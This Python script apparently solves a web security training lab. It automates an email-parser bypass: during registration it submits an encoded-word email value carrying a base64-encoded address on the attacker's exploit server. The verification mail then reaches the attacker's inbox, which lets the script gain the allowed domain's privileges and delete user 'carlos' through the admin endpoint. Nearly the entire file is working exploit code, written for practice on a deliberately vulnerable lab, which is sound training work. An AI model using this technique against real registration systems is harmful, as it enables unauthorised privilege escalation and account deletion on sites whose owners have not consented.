import requests
import re
import base64
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

        self.exploit_server_url = None

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def register_account(self):
        payload = base64.b64encode('hacker0@{} '.format(self.exploit_server_url.replace('https://', '').replace('/email', '')).encode())
        data = {
            'csrf': self.get_csrf_token('register'),
            'username': 'wiener',
            'password': 'peter',
            'email': '=?x?b?{}?=foo@ginandjuice.shop'.format(payload.decode())
        }
        self.session.post(self.lab_url + 'register', data=data)

    def verify_account(self):
        response = self.session.get(self.exploit_server_url)
        verification_url = re.search(r'(https.*temp-registration-token=.*)\'', response.text).group(1)
        self.session.get(verification_url)

    def login_and_delete_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.register_account()
        self.verify_account()
        self.login_and_delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
